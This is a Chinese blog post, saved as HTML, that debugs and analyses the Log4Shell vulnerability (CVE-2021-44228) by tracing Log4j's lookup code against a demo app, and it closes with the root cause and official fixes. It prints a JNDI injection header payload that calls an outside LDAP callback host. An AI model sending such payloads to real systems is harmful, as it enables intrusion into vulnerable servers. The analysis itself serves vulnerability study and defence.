@@ -1,0 +1,649 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    
+    <title>Log4shell（CVE-2021-44228）调试分析 | Math &amp; Sec ，HACHp1的个人博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="Log4shell（CVE-2021-44228）调试分析   Log4shell（CVE-2021-44228）调试分析  环境安装 漏洞触发 漏洞跟踪过程 总结 根本原因和官方修复手段 参考资料">
+<meta name="keywords" content="Web安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Log4shell（CVE-2021-44228）调试分析">
+<meta property="og:url" content="https://hachp1.github.io/posts/Web安全/20220307-log4shell.html">
+<meta property="og:site_name" content="Math &amp; Sec ，HACHp1的个人博客">
+<meta property="og:description" content="Log4shell（CVE-2021-44228）调试分析   Log4shell（CVE-2021-44228）调试分析  环境安装 漏洞触发 漏洞跟踪过程 总结 根本原因和官方修复手段 参考资料">
+<meta property="og:image" content="http://159.75.52.53/img/thumbnails/planet_red.png">
+<meta property="og:updated_time" content="2022-03-07T09:35:36.401Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Log4shell（CVE-2021-44228）调试分析">
+<meta name="twitter:description" content="Log4shell（CVE-2021-44228）调试分析   Log4shell（CVE-2021-44228）调试分析  环境安装 漏洞触发 漏洞跟踪过程 总结 根本原因和官方修复手段 参考资料">
+<meta name="twitter:image" content="http://159.75.52.53/img/thumbnails/planet_red.png">
+    
+
+    
+
+    
+        <link rel="icon" href="/css/images/favicon.png" />
+    
+
+    <link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/libs/open-sans/styles.css">
+    <link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+
+    <link rel="stylesheet" href="/css/style.css">
+
+    <script src="/libs/jquery/2.1.3/jquery.min.js"></script>
+    
+    
+        <link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+    
+    
+    
+    
+    
+
+
+</head>
+
+<body>
+    <div id="container">
+        <header id="header">
+    <div id="header-main" class="header-inner">
+        <div class="outer">
+            <a href="/" id="logo">
+                <i class="logo"></i>
+                <span class="site-title">Math &amp; Sec ，HACHp1的个人博客</span>
+            </a>
+            <nav id="main-nav">
+                
+                    <a class="main-nav-link" href="/.">主页</a>
+                
+                    <a class="main-nav-link" href="/archives">归档</a>
+                
+                    <a class="main-nav-link" href="/categories">目录</a>
+                
+                    <a class="main-nav-link" href="/tags">标签</a>
+                
+                    <a class="main-nav-link" href="/about">关于</a>
+                
+            </nav>
+            
+                
+                <nav id="sub-nav">
+                    <div class="profile" id="profile-nav">
+                        <a id="profile-anchor" href="javascript:;">
+                            <img class="avatar" src="/css/images/avatar.png" />
+                            <i class="fa fa-caret-down"></i>
+                        </a>
+                    </div>
+                </nav>
+            
+            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="搜索" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="想要查找什么..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+</div>
+        </div>
+    </div>
+    <div id="main-nav-mobile" class="header-sub header-inner">
+        <table class="menu outer">
+            <tr>
+                
+                    <td><a class="main-nav-link" href="/.">主页</a></td>
+                
+                    <td><a class="main-nav-link" href="/archives">归档</a></td>
+                
+                    <td><a class="main-nav-link" href="/categories">目录</a></td>
+                
+                    <td><a class="main-nav-link" href="/tags">标签</a></td>
+                
+                    <td><a class="main-nav-link" href="/about">关于</a></td>
+                
+                <td>
+                    
+    <div class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="搜索" />
+    </div>
+
+                </td>
+            </tr>
+        </table>
+    </div>
+</header>
+
+        <div class="outer">
+            
+                
+
+<aside id="profile">
+    <div class="inner profile-inner">
+        <div class="base-info profile-block">
+            <img id="avatar" src="/css/images/avatar.png" />
+            <h2 id="name">HACHp1</h2>
+            <h3 id="title">生活少有按照行动而改变，那就抓住那几个少有的。</h3>
+            <span id="location"><i class="fa fa-map-marker"></i>China</span>
+            <a id="follow" target="_blank" href="https://github.com/hachp1">关注我</a>
+        </div>
+        <div class="article-info profile-block">
+            <div class="article-info-block">
+                41
+                <span>文章</span>
+            </div>
+            <div class="article-info-block">
+                8
+                <span>标签</span>
+            </div>
+        </div>
+        
+        <div class="profile-block social-links">
+            <table>
+                <tr>
+                    
+                    
+                    <td>
+                        <a href="https://github.com/HACHp1" target="_blank" title="GitHub" class=tooltip>
+                            <i class="fa fa-GitHub"></i>
+                        </a>
+                    </td>
+                    
+                </tr>
+            </table>
+        </div>
+        
+    </div>
+</aside>
+
+            
+            <section id="main"><article id="post-Log4shell（CVE-2021-44228）调试分析" class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+    
+        
+            
+	
+		<img src="http://159.75.52.53/img/banner/Eur2.jpg" class="article-banner" />
+	
+
+
+
+        
+        
+        
+        
+        
+        
+        
+        
+            <header class="article-header">
+                
+    
+        <h1 class="article-title" itemprop="name">
+            Log4shell（CVE-2021-44228）调试分析
+        </h1>
+    
+
+                
+                    <div class="article-meta">
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/posts/Web安全/20220307-log4shell.html">
+            <time datetime="2022-03-07T09:33:49.000Z" itemprop="datePublished">2022-03-07</time>
+        </a>
+    </div>
+
+
+                        
+    <div class="article-category">
+    	<i class="fa fa-folder"></i>
+        <a class="article-category-link" href="/categories/Web安全/">Web安全</a>
+    </div>
+
+                        
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/Web安全/">Web安全</a>
+    </div>
+
+                    </div>
+                
+            </header>
+                
+            
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+            
+			<h1 id="log4shellcve-2021-44228调试分析">Log4shell（CVE-2021-44228）调试分析</h1>
+<!-- TOC -->
+<ul>
+<li><a href="#log4shellcve-2021-44228调试分析">Log4shell（CVE-2021-44228）调试分析</a>
+<ul>
+<li><a href="#环境安装">环境安装</a></li>
+<li><a href="#漏洞触发">漏洞触发</a></li>
+<li><a href="#漏洞跟踪过程">漏洞跟踪过程</a></li>
+<li><a href="#总结">总结</a></li>
+<li><a href="#根本原因和官方修复手段">根本原因和官方修复手段</a></li>
+<li><a href="#参考资料">参考资料</a></li>
+</ul></li>
+</ul>
+<!-- /TOC -->
+<a id="more"></a>
+<h2 id="环境安装">环境安装</h2>
+<ul>
+<li>选择<a href="https://github.com/christophetd/log4shell-vulnerable-app" target="_blank" rel="external">Log4Shell sample vulnerable application</a>进行环境构建。为了能够远程调试，将docker中的jar中的lib引入到本地项目中。<code>docker run -p 10086:8080 -p 10087:8000 --name vulnerable-app --rm vulnerable-app</code></li>
+<li>该项目通过<code>spring-boot-starter-log4j2:2.6.1</code>引入包含漏洞的<code>Log4j 2.14.1</code></li>
+</ul>
+<h2 id="漏洞触发">漏洞触发</h2>
+<p>项目中的关键代码如下(MainController.java)：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</div><div class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestHeader;</div><div class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</div><div class="line"></div><div class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</div><div class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</div><div class="line"></div><div class="line"><span class="meta">@RestController</span></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainController</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger(<span class="string">"HelloWorld"</span>);</div><div class="line"></div><div class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/"</span>)</div><div class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">(@RequestHeader(<span class="string">"X-Api-Version"</span>)</span> String apiVersion) </span>&#123;</div><div class="line">        logger.info(<span class="string">"Received a request for API version "</span> + apiVersion);</div><div class="line">        <span class="keyword">return</span> <span class="string">"Hello, world!"</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>在http header中加入：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">X-Api-Version</span>: $&#123;jndi:ldap://xxxx.ceye.io&#125;</div></pre></td></tr></table></figure>
+<h2 id="漏洞跟踪过程">漏洞跟踪过程</h2>
+<p>首先通过<code>LogManager.getLogger(&quot;HelloWorld&quot;)</code>获取HelloWorld的Logger，记录的信息中可以直接触发JNDI导致的反序列化</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">logger.info(<span class="string">"Received a request for API version "</span> + apiVersion);</div></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">info</span><span class="params">(<span class="keyword">final</span> String message)</span> </span>&#123;</div><div class="line">        <span class="keyword">this</span>.logIfEnabled(FQCN, Level.INFO, (Marker)<span class="keyword">null</span>, (String)message, (Throwable)((Throwable)<span class="keyword">null</span>));</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
+<p>需要满足<code>this.isEnabled(level, marker, message, throwable)</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">logIfEnabled</span><span class="params">(<span class="keyword">final</span> String fqcn, <span class="keyword">final</span> Level level, <span class="keyword">final</span> Marker marker, <span class="keyword">final</span> String message, <span class="keyword">final</span> Throwable throwable)</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.isEnabled(level, marker, message, throwable)) &#123;</div><div class="line">            <span class="keyword">this</span>.logMessage(fqcn, level, marker, message, throwable);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125;</div></pre></td></tr></table></figure>
+<p>先不去跟这个条件，直接跟到<code>logMessage</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">logMessage</span><span class="params">(<span class="keyword">final</span> String fqcn, <span class="keyword">final</span> Level level, <span class="keyword">final</span> Marker marker, <span class="keyword">final</span> String message, <span class="keyword">final</span> Throwable throwable)</span> </span>&#123;</div><div class="line">        <span class="keyword">this</span>.logMessageSafely(fqcn, level, marker, <span class="keyword">this</span>.messageFactory.newMessage(message), throwable);</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
+<p>经过一系列跟踪，在callAppenders中的n层会执行format方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</div><div class="line">                <span class="keyword">this</span>.formatters[i].format(event, buffer);</div><div class="line">            &#125;</div></pre></td></tr></table></figure>
+<p>其中会遍历处理各种情况的formatter，当遇到JNDI字符串时，会进入<code>org\apache\logging\log4j\core\pattern\MessagePatternConverter.class</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.config != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.noLookups) &#123;</div><div class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i = offset; i &lt; workingBuilder.length() - <span class="number">1</span>; ++i) &#123;</div><div class="line">                    <span class="keyword">if</span> (workingBuilder.charAt(i) == <span class="string">'$'</span> &amp;&amp; workingBuilder.charAt(i + <span class="number">1</span>) == <span class="string">'&#123;'</span>) &#123;<span class="comment">//注意这里，很明显能看到$&#123;&#125;语句的解析</span></div><div class="line">                        String value = workingBuilder.substring(offset, workingBuilder.length());</div><div class="line">                        workingBuilder.setLength(offset);</div><div class="line">                        workingBuilder.append(<span class="keyword">this</span>.config.getStrSubstitutor().replace(event, value));<span class="comment">//这里的replace方法中包含对JNDI的匹配以及处理</span></div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line">            &#125;</div></pre></td></tr></table></figure>
+<p>跟进去，跟到<code>org\apache\logging\log4j\core\lookup\StrSubstitutor.class</code>中的<code>substitute()</code>的361行的<code>this.substitute(event, bufName, 0, bufName.length())</code>（很明显这是一个递归解析的过程，如果这里匹配出的内容还嵌套了合法的语句，则会进一步解析）：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">           <span class="keyword">if</span> (nestedVarCount == <span class="number">0</span>) &#123;</div><div class="line">               String varNameExpr = <span class="keyword">new</span> String(chars, startPos + startMatchLen, pos - startPos - startMatchLen);</div><div class="line">               <span class="keyword">if</span> (substitutionInVariablesEnabled) &#123;</div><div class="line">                   StringBuilder bufName = <span class="keyword">new</span> StringBuilder(varNameExpr);</div><div class="line">                   <span class="keyword">this</span>.substitute(event, bufName, <span class="number">0</span>, bufName.length());<span class="comment">//执行到这里时，语法解析已经成功把JNDI协议请求的地址匹配出来，跟进这里</span></div><div class="line">                   varNameExpr = bufName.toString();</div><div class="line">               &#125;</div><div class="line"></div><div class="line">               pos += endMatchLen;</div></pre></td></tr></table></figure>
+<p>解析出需要发起JNDI请求的地址时，就会进入如下流程（418行）：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">this</span>.checkCyclicSubstitution(varName, (List)priorVariables);</div><div class="line">((List)priorVariables).add(varName);</div><div class="line">String varValue = <span class="keyword">this</span>.resolveVariable(event, varName, buf, startPos, pos);<span class="comment">//会在此处发起请求，跟进去</span></div><div class="line"><span class="keyword">if</span> (varValue == <span class="keyword">null</span>) &#123;</div><div class="line">    varValue = varDefaultValue;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>然后会根据传入resolveVariable的参数获取相应的lookup，这里的<code>resolver</code>包含多种协议：<code>{date, ctx, lower, upper, main, env, sys, sd, java, marker, jndi, jvmrunargs, event, bundle, map, log4j}</code>，</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">protected</span> String <span class="title">resolveVariable</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String variableName, <span class="keyword">final</span> StringBuilder buf, <span class="keyword">final</span> <span class="keyword">int</span> startPos, <span class="keyword">final</span> <span class="keyword">int</span> endPos)</span> </span>&#123;</div><div class="line">        StrLookup resolver = <span class="keyword">this</span>.getVariableResolver();<span class="comment">//此处会获取多种协议</span></div><div class="line">        <span class="keyword">return</span> resolver == <span class="keyword">null</span> ? <span class="keyword">null</span> : resolver.lookup(event, variableName);<span class="comment">//进行lookup</span></div><div class="line">    &#125;</div></pre></td></tr></table></figure>
+<p>然后进入<code>org\apache\logging\log4j\core\lookup\Interpolator.class</code>，跟到190行，此处会根据prefix字符串找到对应的lookup，之后就会执行lookup：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">String prefix = var.substring(<span class="number">0</span>, prefixPos).toLowerCase(Locale.US);</div><div class="line">String name = var.substring(prefixPos + <span class="number">1</span>);</div><div class="line">StrLookup lookup = (StrLookup)<span class="keyword">this</span>.strLookupMap.get(prefix);<span class="comment">//这里会根据prefix找到相应协议的lookup</span></div><div class="line"><span class="keyword">if</span> (lookup <span class="keyword">instanceof</span> ConfigurationAware) &#123;</div><div class="line">    ((ConfigurationAware)lookup).setConfiguration(<span class="keyword">this</span>.configuration);</div><div class="line">&#125;</div><div class="line"></div><div class="line">String value = <span class="keyword">null</span>;</div><div class="line"><span class="keyword">if</span> (lookup != <span class="keyword">null</span>) &#123;</div><div class="line">    value = event == <span class="keyword">null</span> ? lookup.lookup(name) : lookup.lookup(event, name);<span class="comment">//再跟入这里</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>最后进入<code>org\apache\logging\log4j\core\lookup\JndiLookup.class</code>发起JNDI请求（42行）：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">try</span> &#123;</div><div class="line">    var6 = Objects.toString(jndiManager.lookup(jndiName), (String)<span class="keyword">null</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>到这里整个流程分析完毕。</p>
+<h2 id="总结">总结</h2>
+<ul>
+<li>整个跟洞过程实际上就是对Log4j的format解析过程进行理解和跟踪，理解了如何递归地处理待记录信息中的语法问题等过程，就能够理解Log4shell。</li>
+</ul>
+<h2 id="根本原因和官方修复手段">根本原因和官方修复手段</h2>
+<ul>
+<li>Log4j 2提供了一系列lookup的功能，支持<code>${}</code>语法，能够方便地获取系统信息等（可见<a href="https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution" target="_blank" rel="external">Configuration</a>以及 <a href="https://logging.apache.org/log4j/2.x/manual/lookups.html" target="_blank" rel="external">Lookups</a> 。这些功能中包括一个Jndi Lookup的功能，该功能能够通过日志调用Jndi，是漏洞的关键，造成攻击者能够以<code>${jndi:ldap://xxx.xxx/x}</code>的形式调用JNDI。</li>
+<li>官方给出的临时解决方法：直接删除Jndi类： &gt; Otherwise, in any release other than 2.16.0, you may remove the <code>JndiLookup</code> class from the classpath: <code>zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class</code></li>
+<li>修复1：<a href="https://github.com/apache/logging-log4j2/commit/c77b3cb39312b83b053d23a2158b99ac7de44dd3" target="_blank" rel="external">Restrict LDAP access via JNDI (#608)</a>，该修复中限制了LDAP的目标服务器和可用的类，并且对JNDI的可用协议进行了限制</li>
+<li>在最新版中，该功能仅支持<code>java:</code>和无协议，不支持LDAP协议</li>
+</ul>
+<h2 id="参考资料">参考资料</h2>
+<ul>
+<li><a href="https://logging.apache.org/log4j/2.x/security.html" target="_blank" rel="external">Apache Log4j Security Vulnerabilities</a></li>
+<li><a href="https://lorexxar.cn/2021/12/10/log4j2-jndi/" target="_blank" rel="external">log4j2 JNDI注入漏洞速通</a></li>
+</ul>
+
+        
+        </div>
+        
+        
+        
+        
+<div id="copyright-div">    
+
+    <ul class="post-copyright">
+      <li class="post-copyright-author">
+          <strong>本文作者：<a href="https://github.com/HACHp1">HACHp1</a> </strong>
+      </li>
+      <li class="post-copyright-link">
+        <strong>本文链接：</strong>
+        <a href="/posts/Web安全/20220307-log4shell.html" title="Log4shell（CVE-2021-44228）调试分析">https://hachp1.github.io/posts/Web安全/20220307-log4shell.html</a>
+      </li>
+      <li class="post-copyright-license">
+        <strong>版权声明： </strong>
+        本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0 CN</a> 许可协议。非商业转载请注明作者及出处。商业转载请联系作者本人。
+      </li>
+    </ul>
+ 
+</div>
+
+
+        
+        
+        
+        <footer class="article-footer">
+            <div class="share-container">
+
+
+
+    <div class="a2a_kit a2a_kit_size_32 a2a_default_style">
+<a class="a2a_dd" href="https://www.addtoany.com/share"></a>
+<a class="a2a_button_wechat"></a>
+<a class="a2a_button_qzone"></a>
+<a class="a2a_button_sina_weibo"></a>
+<a class="a2a_button_twitter"></a>
+<a class="a2a_button_facebook"></a>
+<a class="a2a_button_telegram"></a>
+</div>
+<script async src="https://static.addtoany.com/menu/page.js"></script>
+
+<script type="text/javascript" src="//static.addtoany.com/menu/page.js"></script>
+<style>
+    .a2a_menu {
+        border-radius: 4px;
+    }
+    .a2a_menu a {
+        margin: 2px 0;
+        font-size: 14px;
+        line-height: 16px;
+        border-radius: 4px;
+        color: inherit !important;
+        font-family: 'Microsoft Yahei';
+    }
+    #a2apage_dropdown {
+        margin: 10px 0;
+    }
+    .a2a_mini_services {
+        padding: 10px;
+    }
+    a.a2a_i,
+    i.a2a_i {
+        width: 122px;
+        line-height: 16px;
+    }
+    a.a2a_i .a2a_svg,
+    a.a2a_more .a2a_svg {
+        width: 16px;
+        height: 16px;
+        line-height: 16px;
+        vertical-align: top;
+        background-size: 16px;
+    }
+    a.a2a_i {
+        border: none !important;
+    }
+    a.a2a_menu_show_more_less {
+        margin: 0;
+        padding: 10px 0;
+        line-height: 16px;
+    }
+    .a2a_mini_services:after{content:".";display:block;height:0;clear:both;visibility:hidden}
+    .a2a_mini_services{*+height:1%;}
+</style>
+
+</div>
+
+            
+    
+
+        </footer>
+    </div>
+    
+        
+<nav id="article-nav">
+    
+    
+        <a href="/posts/Web安全/20210615-qwb2021.html" id="article-nav-older" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">下一篇</strong>
+            <div class="article-nav-title">强网杯2021 easyxss wp</div>
+        </a>
+    
+</nav>
+
+
+    
+    
+    
+</article>
+
+
+    
+    
+        <section id="comments">
+    <div id="valine-thread"></div>
+</section>
+    
+
+</section>
+            
+                
+<aside id="sidebar">
+   
+        
+    <div class="widget-wrap">
+        <h3 class="widget-title">最新文章</h3>
+        <div class="widget">
+            <ul id="recent-post" class="">
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/posts/Web安全/20220307-log4shell.html" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://159.75.52.53/img/thumbnails/planet_red.png)" alt="Log4shell（CVE-2021-44228）调试分析" class="thumbnail-image"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Web安全/">Web安全</a></p>
+                            <p class="item-title"><a href="/posts/Web安全/20220307-log4shell.html" class="title">Log4shell（CVE-2021-44228）调试分析</a></p>
+                            <p class="item-date"><time datetime="2022-03-07T09:33:49.000Z" itemprop="datePublished">2022-03-07</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/posts/Web安全/20210615-qwb2021.html" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://159.75.52.53/img/thumbnails/cat.jpg)" alt="强网杯2021 easyxss wp" class="thumbnail-image"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Web安全/">Web安全</a></p>
+                            <p class="item-title"><a href="/posts/Web安全/20210615-qwb2021.html" class="title">强网杯2021 easyxss wp</a></p>
+                            <p class="item-date"><time datetime="2021-06-15T06:09:42.000Z" itemprop="datePublished">2021-06-15</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/posts/Web安全/20210607-open_redirect01.html" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://159.75.52.53/img/thumbnails/eggs.jpg)" alt="由一道CTF学习相对路径重定向引发的开放重定向：津门杯2021-GoOSS" class="thumbnail-image"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Web安全/">Web安全</a></p>
+                            <p class="item-title"><a href="/posts/Web安全/20210607-open_redirect01.html" class="title">由一道CTF学习相对路径重定向引发的开放重定向：津门杯2021-GoOSS</a></p>
+                            <p class="item-date"><time datetime="2021-06-07T06:57:35.000Z" itemprop="datePublished">2021-06-07</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/posts/Web安全/20210309-ant2021.html" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://159.75.52.53/img/thumbnails/cat.jpg)" alt="AntCTF2021 部分WP" class="thumbnail-image"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Web安全/">Web安全</a></p>
+                            <p class="item-title"><a href="/posts/Web安全/20210309-ant2021.html" class="title">AntCTF2021 部分WP</a></p>
+                            <p class="item-date"><time datetime="2021-03-09T11:04:04.000Z" itemprop="datePublished">2021-03-09</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/posts/Web安全/20201126-wdbunfinish.html" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://159.75.52.53/img/thumbnails/eggs.jpg)" alt="[网鼎杯2018]Unfinish-二次注入和insert注入的一个误区" class="thumbnail-image"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Web安全/">Web安全</a></p>
+                            <p class="item-title"><a href="/posts/Web安全/20201126-wdbunfinish.html" class="title">[网鼎杯2018]Unfinish-二次注入和insert注入的一个误区</a></p>
+                            <p class="item-date"><time datetime="2020-11-26T08:47:27.000Z" itemprop="datePublished">2020-11-26</time></p>
+                        </div>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+    
+        
+    <div class="widget-wrap">
+        <h3 class="widget-title">标签</h3>
+        <div class="widget">
+            <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux日常/">Linux日常</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web安全/">Web安全</a><span class="tag-list-count">15</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/对抗样本/">对抗样本</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/心情随笔/">心情随笔</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/机器学习/">机器学习</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/机器学习-算法/">机器学习-算法</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/机器学习初步/">机器学习初步</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞分析/">漏洞分析</a><span class="tag-list-count">6</span></li></ul>
+        </div>
+    </div>
+
+    
+        
+    <div class="widget-wrap">
+        <h3 class="widget-title">标签云</h3>
+        <div class="widget tagcloud">
+            <a href="/tags/Linux日常/" style="font-size: 11.67px;">Linux日常</a> <a href="/tags/Web安全/" style="font-size: 20px;">Web安全</a> <a href="/tags/对抗样本/" style="font-size: 10px;">对抗样本</a> <a href="/tags/心情随笔/" style="font-size: 10px;">心情随笔</a> <a href="/tags/机器学习/" style="font-size: 18.33px;">机器学习</a> <a href="/tags/机器学习-算法/" style="font-size: 15px;">机器学习-算法</a> <a href="/tags/机器学习初步/" style="font-size: 13.33px;">机器学习初步</a> <a href="/tags/漏洞分析/" style="font-size: 16.67px;">漏洞分析</a>
+        </div>
+    </div>
+
+    
+        
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">链接</h3>
+        <div class="widget">
+            <ul>
+                
+                    <li>
+                        <a href="https://redogwu.github.io">redogWu</a>
+                    </li>
+                
+                    <li>
+                        <a href="https://hpasserby.top/">Hpasserby</a>
+                    </li>
+                
+                    <li>
+                        <a href="https://xi4or0uji.github.io/">Xi4or0uji</a>
+                    </li>
+                
+                    <li>
+                        <a href="https://jygzyc.github.io">jygzyc</a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+
+    
+    <div id="toTop" class="fa fa-angle-up"></div>
+</aside>
+
+            
+        </div>
+        <footer id="footer">
